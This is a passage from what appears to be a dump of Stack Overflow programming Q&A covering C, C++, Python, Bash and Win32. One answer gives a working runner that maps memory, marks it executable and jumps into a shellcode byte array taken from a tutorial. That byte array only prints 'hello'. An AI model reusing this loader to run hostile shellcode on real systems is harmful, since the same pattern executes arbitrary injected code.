        if (FD_ISSET(fd, &amp;fds))
        {
            // fd can now be read/recv'ed from without blocking
            read(fd, ...);
        }
    }
}

void class::interrupt()
{
    should_exit = 1;

    // Send a dummy message to the pipe to wake up the select() call
    char msg = 0;
    write(interrupt_pipe[0], &amp;msg, 1);
}

class::~class()
{
    // Clean up pipe etc.
    close(interrupt_pipe[0]);
    close(interrupt_pipe[1]);
}
</code></pre>

<p>If you're on Windows, the <code>select()</code> function still works for sockets, but <em>only</em> for sockets, so you should install use <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms687025%28v=vs.85%29.aspx""><code>WaitForMultipleObjects</code></a> to wait on a resource handle and an event handle.  For example:</p>

<pre><code>// Event used for sending interrupt message
HANDLE interrupt_event;
int should_exit = 0;

void class::run()
{
    // Set up the interrupt event as an auto-reset event
    interrupt_event = CreateEvent(NULL, FALSE, FALSE, NULL);
    if (interrupt_event == NULL)
        ;  // Handle error

    HANDLE resource = ...;  // File or resource handle etc.
    while (!should_exit)
    {
        // Wait until one of the handles becomes signaled
        HANDLE handles[2] = {resource, interrupt_event};
        int which_ready = WaitForMultipleObjects(2, handles, FALSE, INFINITE);    
        if (which_ready == WAIT_FAILED)
            ; // Handle error
        else if (which_ready == WAIT_OBJECT_0))
        {
            // resource can now be read from without blocking
            ReadFile(resource, ...);
        }
    }
}

void class::interrupt()
{
    // Signal the event to wake up the waiting thread
    should_exit = 1;
    SetEvent(interrupt_event);
}

class::~class()
{
    // Clean up event etc.
    CloseHandle(interrupt_event);
}
</code></pre>
"
"<p>I am making a basic server/client program, and I am making the client in Python. I have to format the message before I send it. The first field is for message length. I can compute the message length, but I need to store the value in the first two bytes of my bytearray. If the message length is less than 256, it should be only one byte. How can I force the number to be 2 bytes without just tacking a 0x00 onto the front?</p>
","9530","","<p>Use the <a href=""http://docs.python.org/2/library/struct.html"" rel=""nofollow""><code>struct</code> module</a>.  For example, to pack an integer into an unsigned two-byte value in network order (big-endian), you would do this:</p>

<pre><code>&gt; my_value = 1234
&gt; packed_bytes = struct.pack('&gt;H', my_value)
&gt; print packed_bytes
'\x04\xd2'
</code></pre>
"
"<p>There are already questions about counting how many 1s are there in a number, but this question is about judging whether there is even or odd number of 1s. </p>

<p>Any loop or conditional (including switch) statements are not allowed. Also, division, multiplication or modulus operators should be avoided. To be more specific, we may assume that it's a 32-bits unsigned integer.</p>

<p>Actually I've got an implementation already, but I cannot work out the reason why it works. Any proof of its correctness or any new idea would be very helpful.</p>

<pre><code>int even_ones(unsigned x)
{
    x ^= x&gt;&gt;16;
    x ^= x&gt;&gt;8;
    x ^= x&gt;&gt;4;
    x ^= x&gt;&gt;2;
    x ^= x&gt;&gt;1;

    return !(x&amp;1);
}
</code></pre>

<p>Thanks guys.</p>
","9530","","<p><a href=""http://graphics.stanford.edu/~seander/bithacks.html#ParityNaive"" rel=""nofollow"">Here are several variants</a> to quickly compute the parity of a byte or a word.  Exactly which method will be fastest depends on your CPU and how fast the different basic operations are relative to one another.  So if this is somehow the bottleneck of your application, you should profile each one to find out which one runs best on your target machine.</p>

<p>Your solution is very similar to the <a href=""http://graphics.stanford.edu/~seander/bithacks.html#ParityParallel"" rel=""nofollow"">""compute parity in parallel""</a> implementation, just without the clever optimization at the end.  What's going on here is that at each step, you're XORing half of the bits together with the other half of the bits until you have just one bit left.  The parity of a word is 0 if there are an even number of 1's and 1 if there are an odd number of 1's; or equivalently, the parity of a word is just the XOR of all of the bits in the word.</p>

<p>Since the XOR operator is commutative and associative, we can reorder how all of the bits in the word are XORed together.  So instead of calculating the XOR of all the bits by individually XORing each bit into the result, we XOR the higher half of the bits with the lower half of the bits, reducing the number of bits we care about by half; when there's one bit left, we're done.</p>
"
"<p>I plan to edit some data of the text file and here is what I plan to do:</p>

<p>1) Read the original content of the file , get the data of the file using Singly-linked list then close the file</p>

<p>2) Re-open the file but now with ""w+"" then get the edited data then close file</p>

<p>3) use <code>fprintf</code> to write to a New file that contains the edited data</p>

<p>4) Get the original content of the file then put them into the New file.</p>

<p>5) Change the New File's name into the Original content file name</p>

<p>Now, how do you change the name of the text file?</p>

<p>My plan sounds ridiculous, I know:</p>

<p>Q: Why do you plan to change the name of the New File when you can just make the edit happen in the original file?</p>

<p>A: I tried putting the edited data into the original file using ""w+"" and I got lost in the part where I need to get the content of the Original file and put them again into the original file.</p>

<p>Thanks!</p>
","9530","","<p>You can use the <a href=""http://pubs.opengroup.org/onlinepubs/009695399/functions/rename.html"" rel=""nofollow""><code>rename(2)</code></a> function to rename files.  If you're on Windows and need to support Unicode filenames, you can should use the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa365240%28v=vs.85%29.aspx"" rel=""nofollow""><code>MoveFileExW</code></a> function; but if you only need to rename ANSI filenames, use <code>rename()</code> instead since it's more portable.</p>
"
"<p>I have a makefile to build my C++ program. Here is what I want it to do.
1. Take main.cpp, and cipher.cpp, and compile them into .o's
2. Link the two .o's together twice, one into an executable called cipher, the other decipher.</p>

<p>The reason I have two executables is that the main.cpp checks which executable you are using by checking argv, and then does cipher or decipher accordingly.</p>

<p>The makefile I have written is here: <a href=""http://pastebin.com/tWiezRzb"" rel=""nofollow"">Makefile on Pastebin.com</a></p>

<p>Is this a valid/good makefile? I want to know if this will work well and if there are any better ways to do this.</p>
","9530","","<p>Yes, that's certainly valid.  If the two executables are truly intended to be identical, you can save some work by making one a copy or hard link of the other, instead of compiling the same code twice:</p>

<pre><code>cipher: main.o cipher.o
        $(GCC) $(FLAGS) main.o cipher.o -o $@

decipher: cipher
        ln -f $&lt; $@
</code></pre>

<p>Note that I've used the <a href=""http://www.gnu.org/software/make/manual/make.html#Automatic-Variables"" rel=""nofollow"">automatic variables</a> <code>$&lt;</code> and <code>$@</code> to refer to the names of the first prerequisite and the name of the target respectively.  They're not strictly necessary here, but I think they're good practice, since they really come in handy when you start specifying more complex pattern-matching rules.</p>
"
"<p>Good day, Sorry am just a noob in JNI so bear with me if it is a rather silly question :D now For calling a method in a java class from C++ using JNI, you can do this:</p>

<p>Java class:</p>

<pre><code>public int getCount() {     
    return mCount; 
}
</code></pre>

<p>JNI:</p>

<pre><code>JNIEXPORT void JNICALL
Java_com_example_init(JNIEnv* env, jobject obj, jint number)
{
    ...
    jclass Class = env-&gt;GetObjectClass(obj);
    jmethodID getCountMethodID = env-&gt;GetMethodID(Class,
                                                    ""getCount"", ""()I"");
    if (getCountMethodID == 0)
    {
        LOG(""Function getCount() not found."");
        return;
    }
   Count = env-&gt;CallIntMethod(obj, getCountMethodID);
    ...
}
</code></pre>

<p>but how do you just get the instance variable from the java class directly? cannot seem to find an example for this. or is it very straightforward?</p>
","9530","","<p>You use <a href=""http://docs.oracle.com/javase/6/docs/technotes/guides/jni/spec/functions.html#wp16540"" rel=""nofollow""><code>GetFieldID()</code></a> to get the field ID; if you're going to be doing this multiple times or on multiple objects, be sure to cache that field ID instead of looking it up every time.  Then, use the <a href=""http://docs.oracle.com/javase/6/docs/technotes/guides/jni/spec/functions.html#wp16572"" rel=""nofollow""><code>Get&lt;type&gt;Field()</code></a> functions to get the field's value:</p>

<pre><code>jfieldID field = env-&gt;GetFieldID(Class, ""myCount"", ""I"");  // ""I"" = int field
if (field == NULL)
    /* Handle error */;

jint myCount = env-&gt;GetIntField(obj, field);
// Use field value...
</code></pre>
"
"<p>Is there a way to add JPEG comments (""COM"" markers) to an existing JPEG image file using libjpeg?</p>

<p>It is certainly possible to do so by first decompressing an existing image to an in-memory buffer and then compressing the raw image again with jpeg_write_marker( ... JPEG_COM ... ) to add comments, and saving to disk. Unless there is a need to decompress first, doing this seems to be an overkill.</p>
","9530","","<p>You can use <code>jpeg_write_marker()</code> during the writing of the output file to write the comment after setting it up.  Then, use <code>jpeg_read_coefficients()</code> and <code>jpeg_write_coefficients()</code> (in place of the ordinary <code>jpeg_read_scanlines()</code> and <code>jpeg_write_scanlines()</code>) to read and write the raw, compressed data without actually decompressing and recompressing it.</p>

<p>See the section ""Really raw data: DCT coefficients"" in the <a href=""http://mamedev.org/source/src/lib/libjpeg/libjpeg.txt.html"" rel=""nofollow"">jpeglib documentation</a>.  Be sure to read all the caveats mentioned there.</p>
"
"<p>The standard array-size macro that is often taught is</p>

<pre><code>#define ARRAYSIZE(arr) (sizeof(arr) / sizeof(arr[0]))
</code></pre>

<p>or some equivalent formation. However, this kind of thing silently succeeds when a pointer is passed in, and gives results that can seem plausible at runtime until things mysteriously fall apart.</p>

<p>It's all-too-easy to make this mistake: a function that has a local array variable is refactored, moving a bit of array manipulation into a new function called with the array as a parameter.</p>

<p>So, the question is: is there a ""sanitary"" macro to detect misuse of the <code>ARRAYSIZE</code> macro in C, preferably at compile-time? In C++ we'd just use a template specialized for array arguments only; in C, it seems we'll need some way to distinguish arrays and pointers. (If I wanted to reject arrays, for instance, I'd just do e.g. <code>(arr=arr, ...)</code> because array assignment is illegal).</p>
","9530","","<p>Here's one possible solution using a GNU extension called <a href=""http://gcc.gnu.org/onlinedocs/gcc/Statement-Exprs.html"" rel=""nofollow"">statement expressions</a>:</p>

<pre><code>#define ARRAYSIZE(arr) \
    ({typedef char ARRAYSIZE_CANT_BE_USED_ON_POINTERS[sizeof(arr) == sizeof(void*) ? -1 : 1]; \
     sizeof(arr) / sizeof((arr)[0]);})
</code></pre>

<p>This uses a <a href=""http://stackoverflow.com/questions/3385515/static-assert-in-c"">static assertion</a> to assert that <code>sizeof(arr) != sizeof(void*)</code>.  This has an obvious limitation -- you can't use this macro on arrays whose size happens to be exactly one pointer (e.g. a 1-length array of pointers/integers, or maybe a 4-length array of bytes on a 32-bit platform).  But those particular instances can be worked around easily enough.</p>

<p>This solution is not portable to platforms which don't support this GNU extension.  In those cases, I'd recommend just using the standard macro and not worry about accidentally passing in pointers to the macro.</p>
"
"<p>Suppose H is some hash function (such as MD5 or SHA256 or whatever) and I have a collision for this hash: two different pieces of data x and y, that have the same hash.</p>

<p>In other words x≠y but H(x)=H(y).</p>

<p>Now if I concatenate some random data z, will H(x+z) be the same as H(y+z) ?</p>

<p>The idea is: x and y being a collision may imply that they happen to bring the H function in the same state (thus resulting in the same hash). From that point on, it doesn't matter what other data we append, their hashes will remain equal.</p>

<p>I tested the above for <a href=""http://www.mscs.dal.ca/~selinger/md5collision/"" rel=""nofollow"">this MD5 collision</a> and it seemed to work there. But I don't know if this is true in general?</p>
","9530","","<p>This particular technique is called a <a href=""https://en.wikipedia.org/wiki/Length_extension_attack"" rel=""nofollow""><em>length extension attack</em></a>.  Whether or not a hash function is vulnerable obviously depends on the particular hash function.  Hash functions based on the <a href=""https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction"" rel=""nofollow"">Merkle–Damgård construction</a>, such as MD5 and SHA-1, are vulnerable.  SHA-3 is not vulnerable, and <a href=""https://en.wikipedia.org/wiki/HMAC"" rel=""nofollow"">HMAC constructions</a> are also not vulnerable.</p>
"
"<p>I'm currently making a C++ app (to improve my C++).
I'm creating a socket server but I'm stuck.</p>

<p>How I would do it in C#:</p>

<pre><code>using System;
using System.Net;
using System.Net.Sockets;

namespace Network
{
    class HTcpListener
    {
        private Socket mSocket;

        public HTcpListener(int port)
        {
            IPEndPoint endpoint = new IPEndPoint(IPAddress.Any, port);
            mSocket = new Socket(endpoint.AddressFamily, SocketType.Stream, ProtocolType.tcp);
            mSocket.Bind(endpoint);
            mSocket.Listen(10);
            mSocket.BeginAccept(new AsyncCallback(OnAccept));
        }

        private void OnAccept(IAsyncResult iAr)
        {
            // Handle connection and start up game

            mSocket.BeginAccept(new AsyncCallback(OnAccept));
        }
    }
}
</code></pre>

<p>But now I'm wondering. In WinSock2.h there's a function called accept, but I'm wondering if it works the same as BeginAccept, and if not, how to make it function like it would in my C# example. It must have the ability to handle multiple sockets at the same time + more than 1 socket </p>

<p>Thanks in advantage.</p>
","9530","","<p>I'd recommend just using an ordinary blocking <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms737526%28v=vs.85%29.aspx"" rel=""nofollow""><code>accept()</code></a> call on a worker thread to avoid blocking your UI thread.  It's much simpler than dealing with asynchronous sockets.</p>

<p>But if you do need asynchronous sockets, you should use the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms738573%28v=vs.85%29.aspx"" rel=""nofollow""><code>ioctlsocket()</code></a> function to make your socket non-blocking.  Then, <code>accept()</code> will return immediately with the error <code>WSAEWOULDBLOCK</code>.  You can then use that socket as part of a call to <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms740141%28v=vs.85%29.aspx"" rel=""nofollow""><code>select()</code></a>, <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms741576%28v=vs.85%29.aspx"" rel=""nofollow""><code>WSAEventSelect()</code></a> and/or <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms741540%28v=vs.85%29.aspx"" rel=""nofollow""><code>WSAAsyncSelect()</code></a> to  test if the <code>accept()</code> call has completed or wait on multiple sockets at once.</p>

<p>Once one of those <code>select</code>-like calls has indicated that the socket is ready, you can call <code>accept()</code> again on the socket, and it should complete successfully without blocking.  You're done!</p>
"
"<p>This is C++, WINAPI and DirectX.</p>

<p>I create a simple window and it occupies like 1 Mb in the memory (as seen in the Task Manager). When I create the DirectX objects (<code>LPDIRECT3D9</code> and <code>LPDIRECT3DDEVICE9</code>) it goes to like 10 Mb. After I release those two:</p>

<pre><code>if( pd3dDevice != NULL )  
    pd3dDevice-&gt;Release( );
if( pD3D != NULL )  
    pD3D-&gt;Release( );`) 
</code></pre>

<p>The memory doesn't come back to 1 Mb but to about 3 Mb. So I wonder if there's something else to be done or if this is normal.</p>
","9530","","<p>This is normal behavior.  Typically, when you allocate a lot of memory through a function such as <code>malloc()</code> (or one of many other similar functions), after that memory gets freed, it doesn't get returned immediately to the OS.  The allocator will often keep the memory around in a pool under the assumption that the program might want to allocate memory again, so that when it does, it doesn't have to ask the OS for more virtual address space.</p>

<p>So under the hood, here's what usually happens:</p>

<ol>
<li>Program calls <code>malloc(10*1024*1024)</code> to allocate 10 MB</li>
<li><code>malloc()</code> calls <a href=""http://msdn.microsoft.com/en-us/library/aa366887%28v=vs.85%29.ASPX"" rel=""nofollow""><code>VirtualAlloc()</code></a> to allocate 10 MB of virtual address space from the OS.</li>
<li>The OS reports that the program is using 10 MB more virtual memory</li>
<li>The memory is used by the program</li>
<li>Program calls <code>free()</code> to deallocate the 10 MB</li>
<li><code>free()</code> does NOT call <code>VirtualFree()</code> to return the virtual address space back to the OS.</li>
<li>As far as the program is concerned, the memory is freed and cannot be used again; doing so would be Undefined Behavior.  As far as the OS is concerned, the memory is still in use.</li>
<li>If the program later calls <code>malloc(10*1024*1024)</code> again, <code>malloc()</code> can just return that memory again directly without calling <code>VirtualAlloc()</code> to allocate more virtual address space.</li>
</ol>

<p>Now obviously, the exact behavior depends on which allocator is used by DirectX under the hood.  Some allocators <em>will</em> free the memory back to the OS immediately after the program frees it.  But my guess is that DirectX is using an allocator which does not do so.</p>

<p>This is just a case of <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2011/05/12/10163578.aspx"" rel=""nofollow"">looking at the world through kernel-colored glasses</a>.</p>
"
"<p>I am currently working with a problem about data structure using C++.
I am going to check whether the nodes in a singly linked list are sorted in ascending order or not. Here comes some details of my code</p>

<p>Node.cpp</p>

<pre><code>class Node
{
   public:
     double data;       
     Node* next;    
};
</code></pre>

<p>For the part that problem occurs,</p>

<pre><code>double preValue = sLL.head-&gt;data;       
Node *curNode = sLL.head-&gt;next;     

    do
    {
        if (preValue &gt; (preValue = curNode-&gt;data))  // Problem occur in this line   
            return false;
    }while (curNode = curNode-&gt;next);
</code></pre>

<p>As the order of evaluation of '>' operator is evaluating the left hand side expression and then the right hand side expression </p>

<p>AND</p>

<p>the assignment operator would return a reference of the lvalue.</p>

<p>Therefore, <code>preValue &gt; (preValue = curNode-&gt;data)</code> should compares the last node and the current node and assign the data of the next node after the comparison is done. Therefore, I think my implementation should be valid.</p>

<p>However, the result of <code>if(preValue &gt; (preValue = curNode-&gt;data))</code> is out of my expected, when comparing a <code>preValue</code> which is bigger than the new <code>preValue</code>, it keeps returning false.</p>

<p>I have tried to print out the return value of the if statement, it always return 0 whenever the left expression if greater or smaller than the right expression.
I cannot understand why this happen. Could anyone tell me what mistake did I made?</p>

<p>p.s. the program work fine with the following implementation</p>

<pre><code>double preValue = list.head-&gt;data;      
Node *curNode = list.head-&gt;next;            

do
{
    if (preValue &gt; curNode-&gt;data)       // Check ascending order
        return false;

    preValue = curNode-&gt;data;

}while (curNode = curNode-&gt;next);       
</code></pre>
","9530","","<p>This line is Undefined Behavior:</p>

<pre><code>if (preValue &gt; (preValue = curNode-&gt;data))  // Problem occur in this line
</code></pre>

<p>because you're assigning to a variable (<code>preValue</code>) and reading from that same variable, and <em>the read is not used to determine the value written</em>.</p>

<p>From C++03 §5/4 <code>[expr]</code>:</p>

<blockquote>
  <p>[...] Between the previous
  and next sequence point a scalar object shall have its stored value modified at most once by the evaluation
  of an expression. Furthermore, the prior value shall be accessed only to determine the value to be stored.
  The requirements of this paragraph shall be met for each allowable ordering of the subexpressions of a full
  expression; otherwise the behavior is undefined.</p>
</blockquote>

<p>A <em>sequence</em> point occurs after full expressions (i.e. semicolon-terminated expressions or statements), as well as after the first operands of the <code>&amp;&amp;</code>, <code>||</code>, <code>?:</code>, and <code>,</code> operators.  All other operators (including the <code>&gt;</code> operator) do <em>not</em> have sequence points between the evaluations of their arguments.  Sequence points also occur in a few other places not relevant to this question.</p>

<p>The fix, as you said, is to just break it apart so that the assignment happens in a separate statement from the comparison.</p>

<p>When I compile this code with GCC with the <code>-Wall</code> compiler flag, I get this warning:</p>

<pre><code>warning: operation on ‘preValue’ may be undefined [-Wsequence-point]
</code></pre>

<p>I highly recommend you always compile with <code>-Wall</code> and <code>-Werror</code> so that these errors get flagged immediately by the compiler and you can correct them.</p>
"
"<p>I'm trying to create multiple local notifications, in my app, but for some reason only the First Notification Pop's up, the rest just does not work, this is my code.</p>

<p>I have a class named <strong>criaAlertas</strong>, which is responsible for creating the notifications, in that class i have the following method: </p>

<pre><code>-(void)setarNotificacao:(NSInteger)quando nome:(UILocalNotification *)notification 
{
    UIApplication *myapp = [UIApplication sharedApplication];

    notification.fireDate = [NSDate dateWithTimeIntervalSinceNow:quando];
    notification.alertBody = @""Nice"";
    notification.timeZone = [NSTimeZone defaultTimeZone];
    notification.soundName = UILocalNotificationDefaultSoundName;

    NSMutableArray *arrayOfNOtifications = [[NSMutableArray alloc]init];

    [arrayOfNOtifications addObject:notification];
    myapp.scheduledLocalNotifications = arrayOfNOtifications;
}
</code></pre>

<p>So i instantiated a object of that class, and tried to do this:</p>

<pre><code>    criaAlertas *novoAlerta = [[criaAlertas alloc]init];
    UILocalNotification *notaUm = [[UILocalNotification alloc]init];
    UILocalNotification *notaDois = [[UILocalNotification alloc]init];
    [novoAlerta setarNotificacao:15 nome:notaUm];
    [novoAlerta setarNotificacao:30 nome:notaDois];
</code></pre>

<p>What i'm doing wrong?</p>
","9530","","<p>The problem is that you're overwriting all of the local notifications currently scheduled with the call to your <code>-setarNotificacao:nome:</code> function.  This line</p>

<pre><code>    myapp.scheduledLocalNotifications = arrayOfNOtifications;
</code></pre>

<p>sets all of the currently scheduled notifications to <code>arrayOfNotifications</code>; if a notification currently scheduled is not in that array, then it is canceled.</p>

<p>The fix is to use the <a href=""https://developer.apple.com/library/ios/documentation/UIKit/Reference/UIApplication_Class/Reference/Reference.html#//apple_ref/occ/instm/UIApplication/scheduleLocalNotification%3a"" rel=""nofollow""><code>-[UIApplication scheduleLocalNotification:]</code></a> method to schedule the notification, which adds the given notification without canceling any notifications already scheduled:</p>

<pre><code>[myapp scheduleLocalNotification:notification];
</code></pre>
"
"<p>i have this function:</p>

<pre><code>char code[] = ""\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f"";

int main(int argc, char **argv)
{
  int (*func)();
  func = (int (*)()) code;
  (int)(*func)();
}
</code></pre>

<p>(this code is from: <a href=""http://www.vividmachines.com/shellcode/shellcode.html"" rel=""nofollow"">shellcode tutorial</a>)</p>

<p>so i compiled and execute it, but i only get this message: Speicherzugriffsfehler (Speicherabzug geschrieben).</p>

<p>Why i don't get something back, only this error message?</p>

<p>p.s.: my system is an ubuntu x86 pc. the shellcode should work with it. i compiled it with gcc and with gcc-4.5, both same error...</p>
","9530","","<p>Your <code>code</code> variable is an array that's part of your program's <em>initialized data (<code>.data</code>) segment</em>.  When your program is loaded by the OS, the loader reads and executes the load commands from your executable file.  One of those commands is ""load the following data (a segment named <code>.data</code>) into memory"".</p>

<p>Ordinarily, the <code>.data</code> segment is loaded as a <em>non-executable</em> segment, meaning that the memory there cannot be executed.  Therefore, if you try to execute code from there by jumping to it, like you did, then it will crash with a segmentation fault.</p>

<p>There are a couple of ways to work around this.  You can tell the linker to make the <code>.data</code> segment executable (not a good idea).  You can tell the compiler to put the <code>code</code> variable into the <code>.text</code> segment instead (the segment used for all of your program's regular code).  You can tell the compiler and linker to make a new executable segment and put <code>code</code> into that.  All of these are tricky.</p>

<p>The best solution, is to specifically allocate your own executable memory at runtime and copy the shellcode into that.  That completely avoids any potential compiler/linker issues, although it does add a small runtime penalty.  But some OSes don't allow memory to be both writable and executable at the same time; so you'd first have to make it writable, copy the shellcode in, and then make it executable.</p>

<p>The way you control memory permissions at runtime is with the <a href=""http://linux.die.net/man/2/mprotect"" rel=""nofollow""><code>mprotect(2)</code> call</a>.  So here's a good way to do it:</p>

<pre><code>#include &lt;string.h&gt;
#include &lt;sys/mman.h&gt;

char shellcode[] = ""\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f"";

// Error checking omitted for expository purposes
int main(int argc, char **argv)
{
  // Allocate some read-write memory
  void *mem = mmap(0, sizeof(shellcode), PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

  // Copy the shellcode into the new memory
  memcpy(mem, shellcode, sizeof(shellcode));

  // Make the memory read-execute
  mprotect(mem, sizeof(shellcode), PROT_READ|PROT_EXEC);

  // Call the shellcode
  int (*func)();
  func = (int (*)())mem;
  (int)(*func)();

  // Now, if we managed to return here, it would be prudent to clean up the memory:
  munmap(mem, sizeof(shellcode));

  return 0;
}
</code></pre>
"
"<p>Is it possible to ""rumble"" my wireless Xbox 360 controller for PC with Python? I've only found solution for reading input but I cant find information about vibration/rumble.</p>

<p><strong>EDIT:</strong></p>

<p>Following the code provided by @AdamRosenfield I get the following error.</p>

<pre><code>Traceback (most recent call last):
  File ""C:\Users\Usuario\Desktop\rumble.py"", line 8, in &lt;module&gt;
    xinput = ctypes.windll.Xinput  # Load Xinput.dll
  File ""C:\Python27\lib\ctypes\__init__.py"", line 435, in __getattr__
    dll = self._dlltype(name)
  File ""C:\Python27\lib\ctypes\__init__.py"", line 365, in __init__
    self._handle = _dlopen(self._name, mode)
WindowsError: [Error 126] The specified module could not be found. 
</code></pre>

<p><em>Plese note that the last error was translated from Spanish.</em></p>
","9530","","<p>It's possible, but it's not easy.  In C, you'd use the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/microsoft.directx_sdk.reference.xinputsetstate%28v=vs.85%29.aspx"" rel=""nofollow""><code>XInputSetState()</code> function</a> to control the rumble.  To access that from Python, you'd have to either compile a Python extension written in C or use the <a href=""http://docs.python.org/2/library/ctypes.html"" rel=""nofollow""><code>ctypes</code> library</a>.</p>

<p>Something like this should work, though bear in mind I haven't tested this:</p>

<pre><code>import ctypes

# Define necessary structures
class XINPUT_VIBRATION(ctypes.Structure):
    _fields_ = [(""wLeftMotorSpeed"", ctypes.c_ushort),
                (""wRightMotorSpeed"", ctypes.c_ushort)]

xinput = ctypes.windll.xinput1_1  # Load Xinput.dll

# Set up function argument types and return type
XInputSetState = xinput.XInputSetState
XInputSetState.argtypes = [ctypes.c_uint, ctypes.POINTER(XINPUT_VIBRATION)]
XInputSetState.restype = ctypes.c_uint

# Now we're ready to call it.  Set left motor to 100%, right motor to 50%
# for controller 0
vibration = XINPUT_VIBRATION(65535, 32768)
XInputSetState(0, ctypes.byref(vibration))

# You can also create a helper function like this:
def set_vibration(controller, left_motor, right_motor):
    vibration = XINPUT_VIBRATION(int(left_motor * 65535), int(right_motor * 65535))
    XInputSetState(controller, ctypes.byref(vibration))

# ... and use it like so
set_vibration(0, 1.0, 0.5)
</code></pre>
"
"<p>I am trying to write a very simple Bash shell script that will cd in a specific directory, it will remove all files and directories except some few selected ones and then cd back to the original dir.</p>

<p>My code is:</p>

<pre><code>#!/bin/bash 
cd /path/to/desired/directory
shopt -s extglob
rm !\(filename1\|filename2\|filename3\) -rf
cd -
</code></pre>

<p>I have tried many different ways to write the symbols '(' and '|', with single or double quotes or backslash but nothing worked. Note, that <code>shopt -s extglob</code>and <code>rm !(filename1|filename2) -rf</code> work fine outside a script.</p>

<p>Probably I am committing a standard and fundamental bash-scripting error that I cannot see, but experience is to come...</p>

<p>Any suggestions!?
Thanks in advance.</p>
","9530","","<p>Two problems I can see right off the bat:</p>

<ul>
<li>The <code>-rf</code> argument to <code>rm</code> must come <em>before</em> the filenames</li>
<li>The extglob specifiers <code>!</code>, <code>(</code>, <code>|</code> and <code>)</code> should <em>not</em> be escaped with backslashes</li>
</ul>

<p>Try this instead:</p>

<pre><code>rm -rf !(filename1|filename2|filename3)
</code></pre>

<p>If it's still not working, remove the <code>-f</code> argument, and you'll get error messages about what's going wrong instead of silently suppressing them.  To print out the name of each file removed, you can add the <code>-v</code> option as well.</p>
"
"<p>This is the part of my code that doesn't work:</p>

<pre><code>template&lt;typename T&gt;
list&lt;T&gt; f(list&lt;list&lt;T&gt; &gt;&amp; lst,
          void (*op)(list&lt;T&gt;&amp;, list&lt;T&gt;&amp;))
{
    list&lt;list&lt;T&gt; &gt;::iterator itr = lst.begin();

    int count = 0;
    for_each(lst.begin(), lst.end(),
             [&amp;count](list&lt;T&gt; l){ count += l.size(); });

    list&lt;T&gt; res(count);
    res.insert(res.end(), itr-&gt;begin(), itr-&gt;end());

    sort(res.begin(), res.end());

    return res;
}
</code></pre>

<p>VS2012 compiler says error C2784: </p>

<pre><code>error C2784: ''unknown-type' std::operator -(std::move_iterator&lt;_RanIt&gt; &amp;,const 
std::move_iterator&lt;_RanIt2&gt; &amp;)' : could not deduce template argument for 
'std::move_iterator&lt;_RanIt&gt; &amp;' from 'std::_List_iterator&lt;_Mylist&gt;'
</code></pre>

<p>I tried calling </p>

<pre><code>sort&lt;T&gt;(res.begin(), res.end());
</code></pre>

<p>but got the message:</p>

<pre><code>cannot convert parameter 1 from 'std::_List_iterator&lt;_Mylist&gt;' to 'int'
</code></pre>
","9530","","<p>You can't use <a href=""http://en.cppreference.com/w/cpp/algorithm/sort"" rel=""nofollow""><code>std::sort</code></a> on a <code>std::list</code> because a <code>list</code> is not random-access (more specifically, its iterators are not <a href=""http://en.cppreference.com/w/cpp/concept/RandomAccessIterator"" rel=""nofollow""><code>RandomAccessIterators</code></a>).</p>

<p>If you want to sort a <code>list</code>, use its member function <a href=""http://en.cppreference.com/w/cpp/container/list/sort"" rel=""nofollow""><code>std::list&lt;T&gt;::sort()</code></a> instead:</p>

<pre><code>list&lt;T&gt; res(count);
res.insert(res.end(), itr-&gt;begin(), itr-&gt;end());
res.sort();
</code></pre>
"
"<p>What is the meaning of ? operators in the code below? where it is used?</p>

<pre><code>adj[i][j] &lt;?= adj[i][k] &gt;? adj[k][j]
</code></pre>

<p>I coulidn't find this operator anywhere else</p>
","9530","","<p>They're old, non-standard <a href=""http://gcc.gnu.org/onlinedocs/gcc-3.3.6/gcc/Min-and-Max.html"">compiler extensions</a> provided by G++ for computing the minimum or maximum of their operands.  <code>a &lt;? b</code> is equivalent to <code>min(a, b)</code> (where each operator is computed only once, as in a call to an inline function), while <code>a &gt;? b</code> is equivalent to <code>max(a, b)</code>.</p>

<p>The <code>&lt;?=</code> and <code>&gt;?=</code> forms are assignment forms of the operators—<code>a &lt;?=b</code> is equivalent to <code>a = a &lt;? b</code> etc.</p>

<p>In addition to being non-standard, these operators have been deprecated and removed from modern versions of G++.  From the <a href=""http://gcc.gnu.org/onlinedocs/gcc/Deprecated-Features.html#Deprecated-Features"">deprecated features</a> page:</p>

<blockquote>
  <p>The G++ minimum and maximum operators (‘<code>&lt;?</code>’ and ‘<code>&gt;?</code>’) and their compound forms (‘<code>&lt;?=</code>’) and ‘<code>&gt;?=</code>’) have been deprecated and are now removed from G++. Code using these operators should be modified to use <code>std::min</code> and <code>std::max</code> instead. </p>
</blockquote>
"
"<p>My project is about sniffing the data from Ethernet in promiscuous mode. That is Client  receives the packets and saves it in a binary file called ""sniff_data.bin"". and sends it to the server. The server then processes it(distinguishes between tcp,udp,icmp). I have implemented this but the problem is the size of the file which has been sent by client does not match with the file received in the server. I mean to say i have given count of 10 to sniff the packets upto 10 count. but in the server side only 3 packets are being displayed.can anybody help me out why is this problem arising?
My client code is:</p>

<pre><code>int main( int argc,char *argv[])
{
int infosockfd,cont,cont2;

int len,fh;
struct sockaddr_in address;
int result;
int buffsize=1024;
char buffer[1024];
char *fname = ""/home/shishira/Desktop/packet_capture/sniff_data.bin"";

/*  Create a socket for the client.  */
if((infosockfd = socket(AF_INET,SOCK_STREAM,0))&gt;0)
